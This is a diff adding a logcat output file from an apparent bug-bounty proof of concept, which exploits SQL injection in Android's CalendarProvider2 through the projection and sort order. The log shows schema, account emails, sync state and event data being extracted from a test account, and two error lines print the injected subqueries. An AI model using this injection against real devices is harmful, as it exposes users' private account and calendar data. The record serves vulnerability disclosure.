@@ -1,0 +1,221 @@
+--------- beginning of main
+09-26 01:37:08.816 24217 24217 D CalFullDump: Output file: /data/user/0/com.vrp.poc/files/calendar_full_dump.txt
+09-26 01:37:08.817 24217 24246 D CalFullDump: ╔══════════════════════════════════════════╗
+09-26 01:37:08.817 24217 24246 D CalFullDump: ║  MAXIMUM IMPACT PROOF: CalendarProvider2 ║
+09-26 01:37:08.817 24217 24246 D CalFullDump: ║  SQL Injection via Projection + SortOrder║
+09-26 01:37:08.817 24217 24246 D CalFullDump: ╚══════════════════════════════════════════╝
+09-26 01:37:08.817 24217 24246 D CalFullDump: ━━━ 1. FULL SCHEMA DUMP (sqlite_master) ━━━
+09-26 01:37:08.817 24217 24246 D CalFullDump: [*] Extracting CREATE TABLE statements for all tables...
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE android_metadata (locale TEXT)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE _sync_state_metadata (version INTEGER)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE Colors (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,color_type INTEGER NOT NULL,color_index TEXT NOT NULL,color INTEGER NOT NULL)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE Calendars (_id INTEGER PRIMARY KEY,account_name TEXT,account_type TEXT,_sync_id TEXT,dirty INTEGER,mutators TEXT,name TEXT,calendar_displayName TEXT,calendar_color INTEGER,calendar_color_index TEXT,calendar_access_level INTEGER,visible INTEGER NOT NULL DEFAULT 1,sync_events INTEGER NOT NULL DEFAULT 0,calendar_location TEXT,calendar_timezone TEXT,ownerAccount TEXT, isPrimary INTEGER, canOrganizerRespond INTEGER NOT NULL DEFAULT 1,canModifyTimeZone INTEGER DEFAULT 1,canPartiallyUpdate INTEGER DEFAULT 0,maxReminders INTEGER DEFAULT 5,allowedReminders TEXT DEFAULT '0,1',allowedAvailability TEXT DEFAULT '0,1',allowedAttendeeTypes TEXT DEFAULT '0,1,2',deleted INTEGER NOT NULL DEFAULT 0,cal_sync1 TEXT,cal_sync2 TEXT,cal_sync3 TEXT,cal_sync4 TEXT,cal_sync5 TEXT,cal_sync6 TEXT,cal_sync7 TEXT,cal_sync8 TEXT,cal_sync9 TEXT,cal_sync10 TEXT)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE Events (_id INTEGER PRIMARY KEY AUTOINCREMENT,_sync_id TEXT,dirty INTEGER,mutators TEXT,lastSynced INTEGER DEFAULT 0,calendar_id INTEGER NOT NULL,title TEXT,eventLocation TEXT,description TEXT,eventColor INTEGER,eventColor_index TEXT,eventStatus INTEGER,selfAttendeeStatus INTEGER NOT NULL DEFAULT 0,dtstart INTEGER,dtend INTEGER,eventTimezone TEXT,duration TEXT,allDay INTEGER NOT NULL DEFAULT 0,accessLevel INTEGER NOT NULL DEFAULT 0,availability INTEGER NOT NULL DEFAULT 0,hasAlarm INTEGER NOT NULL DEFAULT 0,hasExtendedProperties INTEGER NOT NULL DEFAULT 0,rrule TEXT,rdate TEXT,exrule TEXT,exdate TEXT,original_id INTEGER,original_sync_id TEXT,originalInstanceTime INTEGER,originalAllDay INTEGER,lastDate INTEGER,hasAttendeeData INTEGER NOT NULL DEFAULT 0,guestsCanModify INTEGER NOT NULL DEFAULT 0,guestsCanInviteOthers INTEGER NOT NULL DEFAULT 1,guestsCanSeeGuests INTEGER NOT NULL DEFAULT 1,organizer STRING,isOrganizer INTEGER,deleted INTEGER NOT NULL DEFAULT 0,eventEndTimezone TEXT,customAppPackage TEXT,customAppUri TEXT,uid2445 TEXT,sync_data1 TEXT,sync_data2 TEXT,sync_data3 TEXT,sync_data4 TEXT,sync_data5 TEXT,sync_data6 TEXT,sync_data7 TEXT,sync_data8 TEXT,sync_data9 TEXT,sync_data10 TEXT)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE sqlite_sequence(name,seq)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE EventsRawTimes (_id INTEGER PRIMARY KEY,event_id INTEGER NOT NULL,dtstart2445 TEXT,dtend2445 TEXT,originalInstanceTime2445 TEXT,lastDate2445 TEXT,UNIQUE (event_id))
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE Instances (_id INTEGER PRIMARY KEY,event_id INTEGER,begin INTEGER,end INTEGER,startDay INTEGER,endDay INTEGER,startMinute INTEGER,endMinute INTEGER,UNIQUE (event_id, begin, end))
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE CalendarMetaData (_id INTEGER PRIMARY KEY,localTimezone TEXT,minInstance INTEGER,maxInstance INTEGER)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE CalendarCache (_id INTEGER PRIMARY KEY,key TEXT NOT NULL,value TEXT)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE Attendees (_id INTEGER PRIMARY KEY,event_id INTEGER,attendeeName TEXT,attendeeEmail TEXT,attendeeStatus INTEGER,attendeeRelationship INTEGER,attendeeType INTEGER,attendeeIdentity TEXT,attendeeIdNamespace TEXT)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE Reminders (_id INTEGER PRIMARY KEY,event_id INTEGER,minutes INTEGER,method INTEGER NOT NULL DEFAULT 0)
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE CalendarAlerts (_id INTEGER PRIMARY KEY,event_id INTEGER,begin INTEGER NOT NULL,end INTEGER NOT NULL,alarmTime INTEGER NOT NULL,creationTime INTEGER NOT NULL DEFAULT 0,receivedTime INTEGER NOT NULL DEFAULT 0,notifyTime INTEGER NOT NULL DEFAULT 0,state INTEGER NOT NULL,minutes INTEGER,UNIQUE (alarmTime, begin, event_id))
+09-26 01:37:08.822 24217 24246 D CalFullDump:   CREATE TABLE ExtendedProperties (_id INTEGER PRIMARY KEY,event_id INTEGER,name TEXT,value TEXT)
+09-26 01:37:08.822 24217 24246 D CalFullDump: [*] Extracting all indexes...
+09-26 01:37:08.826 24217 24246 D CalFullDump:   CREATE INDEX eventsCalendarIdIndex ON Events (calendar_id)
+09-26 01:37:08.826 24217 24246 D CalFullDump:   CREATE INDEX instancesStartDayIndex ON Instances (startDay)
+09-26 01:37:08.826 24217 24246 D CalFullDump:   CREATE INDEX attendeesEventIdIndex ON Attendees (event_id)
+09-26 01:37:08.826 24217 24246 D CalFullDump:   CREATE INDEX remindersEventIdIndex ON Reminders (event_id)
+09-26 01:37:08.826 24217 24246 D CalFullDump:   CREATE INDEX calendarAlertsEventIdIndex ON CalendarAlerts (event_id)
+09-26 01:37:08.826 24217 24246 D CalFullDump:   CREATE INDEX extendedPropertiesEventIdIndex ON ExtendedProperties (event_id)
+09-26 01:37:08.826 24217 24246 D CalFullDump: [*] Extracting all triggers...
+09-26 01:37:08.829 24217 24246 D CalFullDump:   calendar_cleanup: CREATE TRIGGER calendar_cleanup DELETE ON Calendars BEGIN DELETE FROM Events WHERE calendar_id=old._id;END
+09-26 01:37:08.829 24217 24246 D CalFullDump:   events_cleanup_delete: CREATE TRIGGER events_cleanup_delete DELETE ON Events BEGIN DELETE FROM Instances WHERE event_id=old._id;DELETE FROM EventsRawTimes WHERE event_id=old._id;DELETE FROM Attendees WHERE event_id=old._id;DELETE FROM Reminders WHERE event_id=old._id;DELETE FROM CalendarAlerts WHERE event_id=old._id;DELETE FROM ExtendedProperties WHERE event_id=old._id;END
+09-26 01:37:08.829 24217 24246 D CalFullDump:   event_color_update: CREATE TRIGGER event_color_update UPDATE OF eventColor_index ON Events WHEN new.eventColor_index NOT NULL BEGIN UPDATE Events SET eventColor=(SELECT color FROM Colors WHERE account_name=(SELECT account_name FROM Calendars WHERE _id=new.calendar_id) AND account_type=(SELECT account_type FROM Calendars WHERE _id=new.calendar_id) AND color_index=new.eventColor_index AND color_type=1)  WHERE _id=old._id; END
+09-26 01:37:08.829 24217 24246 D CalFullDump:   calendar_color_update: CREATE TRIGGER calendar_color_update UPDATE OF calendar_color_index ON Calendars WHEN new.calendar_color_index NOT NULL BEGIN UPDATE Calendars SET calendar_color=(SELECT color FROM Colors WHERE account_name=new.account_name AND account_type=new.account_type AND color_index=new.calendar_color_index AND color_type=0)  WHERE _id=old._id; END
+09-26 01:37:08.829 24217 24246 D CalFullDump:   original_sync_update: CREATE TRIGGER original_sync_update UPDATE OF _sync_id ON Events BEGIN UPDATE Events SET original_sync_id=new._sync_id WHERE original_id=old._id; END
+09-26 01:37:08.829 24217 24246 D CalFullDump: ━━━ 2. ALL GOOGLE ACCOUNT EMAILS ━━━
+09-26 01:37:08.833 24217 24246 D CalFullDump:   Accounts: sandiyotest@gmail.com
+09-26 01:37:08.835 24217 24246 D CalFullDump:   With types: sandiyotest@gmail.com [com.google]
+09-26 01:37:08.836 24217 24246 D CalFullDump:   Calendar owners: en-gb.indian#holiday@group.v.calendar.google.com,en.indian#holiday@group.v.calendar.google.com,classroom111771798454834833104@group.calendar.google.com,sandiyotest@gmail.com
+09-26 01:37:08.836 24217 24246 D CalFullDump: ━━━ 3. FULL _sync_state DUMP ━━━
+09-26 01:37:08.838 24217 24246 D CalFullDump:   _sync_state rows: 1
+09-26 01:37:08.840 24217 24246 D CalFullDump:   Accounts: sandiyotest@gmail.com|com.google|length=513
+09-26 01:37:08.841 24217 24246 D CalFullDump:   Raw hex length: 1026 chars (513 bytes)
+09-26 01:37:08.841 24217 24246 D CalFullDump:   DECODED SYNC DATA:
+09-26 01:37:08.841 24217 24246 D CalFullDump:     {"version":16,"firstSeen":false,"jellyBeanOrNewer":true,"b38085245":2147483647,"package":"com.google.android.calendar","
+09-26 01:37:08.841 24217 24246 D CalFullDump:     sandiyotest@gmail.com":{},"en-gb.indian#holiday@group.v.calendar.google.com":{"window_end":1822176000000,"feed_updated_t
+09-26 01:37:08.841 24217 24246 D CalFullDump:     ime":"2026-09-14T07:55:59.492Z","last_sync_time":1789874320128,"do_incremental_sync":true},"en.indian#holiday@group.v.ca
+09-26 01:37:08.841 24217 24246 D CalFullDump:     lendar.google.com":{"window_end":1822176000000,"feed_updated_time":"2026-09-14T07:55:59.492Z","last_sync_time":178987432
+09-26 01:37:08.841 24217 24246 D CalFullDump:     0618,"do_incremental_sync":true}}
+09-26 01:37:08.846 24217 24246 D CalFullDump: ━━━ 4. ALL CALENDAR DETAILS ━━━
+09-26 01:37:08.849 24217 24246 D CalFullDump:   Total calendars: 4
+09-26 01:37:08.850 24217 24246 D CalFullDump:   Calendar[0]: 1|sandiyotest@gmail.com|Holidays in India|Holidays in India|en-gb.indian#holiday@group.v.calendar.google.com|com.google
+09-26 01:37:08.852 24217 24246 D CalFullDump:   Calendar[1]: 2|sandiyotest@gmail.com|Holidays in India|Holidays in India|en.indian#holiday@group.v.calendar.google.com|com.google
+09-26 01:37:08.854 24217 24246 D CalFullDump:   Calendar[2]: 3|sandiyotest@gmail.com|Google-BB|Google-BB|classroom111771798454834833104@group.calendar.google.com|com.google
+09-26 01:37:08.857 24217 24246 D CalFullDump:   Calendar[3]: 4|sandiyotest@gmail.com|sandiyotest@gmail.com|sandiyotest@gmail.com|sandiyotest@gmail.com|com.google
+09-26 01:37:08.859 24217 24246 D CalFullDump:   [*] Calendar sync URLs (cal_sync1)...
+09-26 01:37:08.861 24217 24246 D CalFullDump:     1: en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.861 24217 24246 D CalFullDump:     2: en.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.861 24217 24246 D CalFullDump:     3: classroom111771798454834833104@group.calendar.google.com
+09-26 01:37:08.861 24217 24246 D CalFullDump:     4: sandiyotest@gmail.com
+09-26 01:37:08.861 24217 24246 D CalFullDump: ━━━ 5. ALL EVENT TITLES + DESCRIPTIONS + LOCATIONS ━━━
+09-26 01:37:08.862 24217 24246 D CalFullDump:   Total events: 272
+09-26 01:37:08.867 24217 24246 D CalFullDump:   Event[0]: 2|New Year's Day||Observance
+09-26 01:37:08.867 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1767225600000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.869 24217 24246 D CalFullDump:   Event[1]: 3|Rath Yatra||Observance
+09-26 01:37:08.869 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1784160000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.870 24217 24246 D CalFullDump:   Event[2]: 4|Republic Day||Public holiday|1800921600000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.872 24217 24246 D CalFullDump:   Event[3]: 5|Ugadi||Observance
+09-26 01:37:08.872 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1807056000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.873 24217 24246 D CalFullDump:   Event[4]: 6|Ambedkar Jayanti||Observance
+09-26 01:37:08.873 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1807660800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.874 24217 24246 D CalFullDump:   Event[5]: 7|Diwali/Deepavali||Public holiday|1760918400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.875 24217 24246 D CalFullDump:   Event[6]: 8|Gudi Padwa||Observance
+09-26 01:37:08.875 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1773878400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.876 24217 24246 D CalFullDump:   Event[7]: 9|Diwali/Deepavali||Public holiday|1794096000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.877 24217 24246 D CalFullDump:   Event[8]: 10|Janmashtami (Smarta)||Observance
+09-26 01:37:08.877 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1819152000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.878 24217 24246 D CalFullDump:   Event[9]: 11|Maha Ashtami||Observance
+09-26 01:37:08.878 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1759190400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.880 24217 24246 D CalFullDump:   Event[10]: 12|Christmas Eve||Observance
+09-26 01:37:08.880 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1798070400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.884 24217 24246 D CalFullDump:   Event[11]: 13|New Year's Day||Observance
+09-26 01:37:08.884 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1798761600000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.886 24217 24246 D CalFullDump:   Event[12]: 15|Christmas Eve||Observance
+09-26 01:37:08.886 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1766534400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.888 24217 24246 D CalFullDump:   Event[13]: 16|Shivaji Jayanti||Observance
+09-26 01:37:08.888 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1771459200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.889 24217 24246 D CalFullDump:   Event[14]: 17|Mahatma Gandhi Jayanti||Public holiday|1790899200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.890 24217 24246 D CalFullDump:   Event[15]: 18|First Day of Sharad Navratri||Observance
+09-26 01:37:08.890 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1791676800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.891 24217 24246 D CalFullDump:   Event[16]: 19|First Day of Sharad Navratri||Observance
+09-26 01:37:08.891 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1758499200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.892 24217 24246 D CalFullDump:   Event[17]: 20|Maha Saptami||Observance
+09-26 01:37:08.892 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1759104000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.893 24217 24246 D CalFullDump:   Event[18]: 21|Maha Navami||Observance
+09-26 01:37:08.893 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1759276800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.895 24217 24246 D CalFullDump:   Event[19]: 22|Maharishi Valmiki Jayanti||Observance
+09-26 01:37:08.895 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1759795200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.896 24217 24246 D CalFullDump:   Event[20]: 23|Vasant Panchami||Observance
+09-26 01:37:08.896 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1769126400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.899 24217 24246 D CalFullDump:   Event[21]: 24|Bhai Duj||Observance
+09-26 01:37:08.899 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1794355200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.904 24217 24246 D CalFullDump:   Event[22]: 25|Independence Day||Public holiday|1818288000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.905 24217 24246 D CalFullDump:   Event[23]: 26|Guru Nanak Jayanti||Public holiday|1762300800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.906 24217 24246 D CalFullDump:   Event[24]: 27|Guru Tegh Bahadur's Martyrdom Day||Observance
+09-26 01:37:08.906 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1763942400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.907 24217 24246 D CalFullDump:   Event[25]: 28|Hazarat Ali's Birthday||Observance
+09-26 01:37:08.907 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1767398400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.909 24217 24246 D CalFullDump:   Event[26]: 29|Onam||Observance
+09-26 01:37:08.909 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1787702400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.910 24217 24246 D CalFullDump:   Event[27]: 30|Guru Tegh Bahadur's Martyrdom Day||Observance
+09-26 01:37:08.910 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1795478400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.911 24217 24246 D CalFullDump:   Event[28]: 32|Dussehra||Public holiday|1759363200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.912 24217 24246 D CalFullDump:   Event[29]: 33|Mahatma Gandhi Jayanti||Public holiday|1759363200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.913 24217 24246 D CalFullDump:   Event[30]: 34|Christmas||Public holiday|1766620800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.917 24217 24246 D CalFullDump:   Event[31]: 35|Pongal||Observance
+09-26 01:37:08.917 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1768348800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.919 24217 24246 D CalFullDump:   Event[32]: 36|Rama Navami||Public holiday|1774483200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.920 24217 24246 D CalFullDump:   Event[33]: 37|Pongal||Observance
+09-26 01:37:08.920 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1799971200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.921 24217 24246 D CalFullDump:   Event[34]: 38|Janmashtami||Public holiday|1819152000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.923 24217 24246 D CalFullDump:   Event[35]: 39|Onam||Observance
+09-26 01:37:08.923 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1757030400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.924 24217 24246 D CalFullDump:   Event[36]: 40|Republic Day||Public holiday|1769385600000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.925 24217 24246 D CalFullDump:   Event[37]: 41|Holi||Public holiday|1772582400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.926 24217 24246 D CalFullDump:   Event[38]: 42|Janmashtami||Public holiday|1788480000000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.928 24217 24246 D CalFullDump:   Event[39]: 43|Good Friday||Public holiday|1806019200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.929 24217 24246 D CalFullDump:   Event[40]: 44|First Day of Durga Puja Festivities||Observance
+09-26 01:37:08.929 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1759017600000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.933 24217 24246 D CalFullDump:   Event[41]: 45|Bhai Duj||Observance
+09-26 01:37:08.933 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1761177600000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.935 24217 24246 D CalFullDump:   Event[42]: 46|Good Friday||Public holiday|1775174400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.937 24217 24246 D CalFullDump:   Event[43]: 47|First Day of Durga Puja Festivities||Observance
+09-26 01:37:08.937 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1792195200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.938 24217 24246 D CalFullDump:   Event[44]: 48|Chhat Puja (Pratihar Sashthi/Surya Sashthi)||Observance
+09-26 01:37:08.938 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1794700800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.939 24217 24246 D CalFullDump:   Event[45]: 49|Christmas||Public holiday|1798156800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.940 24217 24246 D CalFullDump:   Event[46]: 51|Shivaji Jayanti||Observance
+09-26 01:37:08.940 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1802995200000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.941 24217 24246 D CalFullDump:   Event[47]: 53|Naraka Chaturdasi||Observance
+09-26 01:37:08.941 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1760918400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.942 24217 24246 D CalFullDump:   Event[48]: 54|Makar Sankranti||Observance
+09-26 01:37:08.942 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1768348800000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.943 24217 24246 D CalFullDump:   Event[49]: 55|Ugadi||Observance
+09-26 01:37:08.943 24217 24246 D CalFullDump: To hide observances, go to Google Calendar Settings > Holidays in India|1773878400000|en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.944 24217 24246 D CalFullDump:   ... (222 more events available)
+09-26 01:37:08.944 24217 24246 D CalFullDump: ━━━ 6. ALL ATTENDEE EMAILS ━━━
+09-26 01:37:08.945 24217 24246 D CalFullDump:   Total attendee records: 0
+09-26 01:37:08.946 24217 24246 D CalFullDump:   Distinct attendee emails: 0
+09-26 01:37:08.952 24217 24246 D CalFullDump: ━━━ 7. ALL ORGANIZER EMAILS ━━━
+09-26 01:37:08.953 24217 24246 D CalFullDump:   ALL ORGANIZER EMAILS:
+09-26 01:37:08.953 24217 24246 D CalFullDump:     → en-gb.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.953 24217 24246 D CalFullDump:     → en.indian#holiday@group.v.calendar.google.com
+09-26 01:37:08.953 24217 24246 D CalFullDump: ━━━ 8. ALL EXTENDED PROPERTIES ━━━
+09-26 01:37:08.955 24217 24246 D CalFullDump:   Total extended properties: 272
+09-26 01:37:08.956 24217 24246 D CalFullDump:   ExtProp[0]: 2|secretEvent|0
+09-26 01:37:08.957 24217 24246 D CalFullDump:   ExtProp[1]: 3|secretEvent|0
+09-26 01:37:08.958 24217 24246 D CalFullDump:   ExtProp[2]: 4|secretEvent|0
+09-26 01:37:08.959 24217 24246 D CalFullDump:   ExtProp[3]: 5|secretEvent|0
+09-26 01:37:08.960 24217 24246 D CalFullDump:   ExtProp[4]: 6|secretEvent|0
+09-26 01:37:08.961 24217 24246 D CalFullDump:   ExtProp[5]: 7|secretEvent|0
+09-26 01:37:08.962 24217 24246 D CalFullDump:   ExtProp[6]: 8|secretEvent|0
+09-26 01:37:08.963 24217 24246 D CalFullDump:   ExtProp[7]: 9|secretEvent|0
+09-26 01:37:08.967 24217 24246 D CalFullDump:   ExtProp[8]: 10|secretEvent|0
+09-26 01:37:08.969 24217 24246 D CalFullDump:   ExtProp[9]: 11|secretEvent|0
+09-26 01:37:08.970 24217 24246 D CalFullDump:   ExtProp[10]: 12|secretEvent|0
+09-26 01:37:08.971 24217 24246 D CalFullDump:   ExtProp[11]: 13|secretEvent|0
+09-26 01:37:08.973 24217 24246 D CalFullDump:   ExtProp[12]: 15|secretEvent|0
+09-26 01:37:08.974 24217 24246 D CalFullDump:   ExtProp[13]: 16|secretEvent|0
+09-26 01:37:08.975 24217 24246 D CalFullDump:   ExtProp[14]: 17|secretEvent|0
+09-26 01:37:08.976 24217 24246 D CalFullDump:   ExtProp[15]: 18|secretEvent|0
+09-26 01:37:08.977 24217 24246 D CalFullDump:   ExtProp[16]: 19|secretEvent|0
+09-26 01:37:08.978 24217 24246 D CalFullDump:   ExtProp[17]: 20|secretEvent|0
+09-26 01:37:08.979 24217 24246 D CalFullDump:   ExtProp[18]: 21|secretEvent|0
+09-26 01:37:08.982 24217 24246 D CalFullDump:   ExtProp[19]: 22|secretEvent|0
+09-26 01:37:08.985 24217 24246 D CalFullDump:   ExtProp[20]: 23|secretEvent|0
+09-26 01:37:08.986 24217 24246 D CalFullDump:   ExtProp[21]: 24|secretEvent|0
+09-26 01:37:08.987 24217 24246 D CalFullDump:   ExtProp[22]: 25|secretEvent|0
+09-26 01:37:08.988 24217 24246 D CalFullDump:   ExtProp[23]: 26|secretEvent|0
+09-26 01:37:08.989 24217 24246 D CalFullDump:   ExtProp[24]: 27|secretEvent|0
+09-26 01:37:08.990 24217 24246 D CalFullDump:   ExtProp[25]: 28|secretEvent|0
+09-26 01:37:08.991 24217 24246 D CalFullDump:   ExtProp[26]: 29|secretEvent|0
+09-26 01:37:08.992 24217 24246 D CalFullDump:   ExtProp[27]: 30|secretEvent|0
+09-26 01:37:08.993 24217 24246 D CalFullDump:   ExtProp[28]: 32|secretEvent|0
+09-26 01:37:08.995 24217 24246 D CalFullDump:   ExtProp[29]: 33|secretEvent|0
+09-26 01:37:08.995 24217 24246 D CalFullDump: ━━━ 9. CalendarMetaData ━━━
+09-26 01:37:08.996 24217 24246 D CalFullDump:   CalendarMetaData rows: 1
+09-26 01:37:08.999 24217 24246 D CalFullDump:   MetaData[0]: 1|tz=Asia/Kolkata|minInst=1764547200000|maxInst=1793557800752
+09-26 01:37:09.002 24217 24246 D CalFullDump: ━━━ 10. CalendarCache (ALL entries) ━━━
+09-26 01:37:09.003 24217 24246 D CalFullDump:   CalendarCache rows: 4
+09-26 01:37:09.004 24217 24246 D CalFullDump:   timezoneDatabaseVersion = 2026c
+09-26 01:37:09.004 24217 24246 D CalFullDump:   timezoneInstancesPrevious = Asia/Kolkata
+09-26 01:37:09.004 24217 24246 D CalFullDump:   timezoneType = auto
+09-26 01:37:09.004 24217 24246 D CalFullDump:   timezoneInstances = Asia/Kolkata
+09-26 01:37:09.004 24217 24246 D CalFullDump: ━━━ 11. _sync_state_metadata ━━━
+09-26 01:37:09.005 24217 24246 D CalFullDump:   _sync_state_metadata rows: 1
+09-26 01:37:09.006 24217 24246 D CalFullDump:   ERROR: SQLiteException: no such column: data (code 1 SQLITE_ERROR): , while compiling: SELECT (SELECT hex(data) FROM _sync_state_metadata LIMIT 1 OFFSET 0) AS ssm_0 FROM view_events WHERE (lastSynced = 0) ORDER BY _id LIMIT 1
+09-26 01:37:09.006 24217 24246 D CalFullDump: ━━━ 12. EVENT SYNC IDs (Google Calendar API identifiers) ━━━
+09-26 01:37:09.007 24217 24246 D CalFullDump:   ERROR: SQLiteException: DISTINCT aggregates must have exactly one argument (code 1 SQLITE_ERROR): , while compiling: SELECT (SELECT group_concat(DISTINCT _sync_id, char(10)) FROM Events WHERE _sync_id IS NOT NULL) AS sync_ids FROM view_events WHERE (lastSynced = 0) ORDER BY _id LIMIT 1
+09-26 01:37:09.007 24217 24246 D CalFullDump: ━━━ 13. CALENDAR SUBSCRIPTION URLs ━━━
+09-26 01:37:09.008 24217 24246 D CalFullDump:   1: sync1=en-gb.indian#holiday@group.v.calendar.google.com | sync2=null | sync3=null
+09-26 01:37:09.008 24217 24246 D CalFullDump:   2: sync1=en.indian#holiday@group.v.calendar.google.com | sync2=null | sync3=null
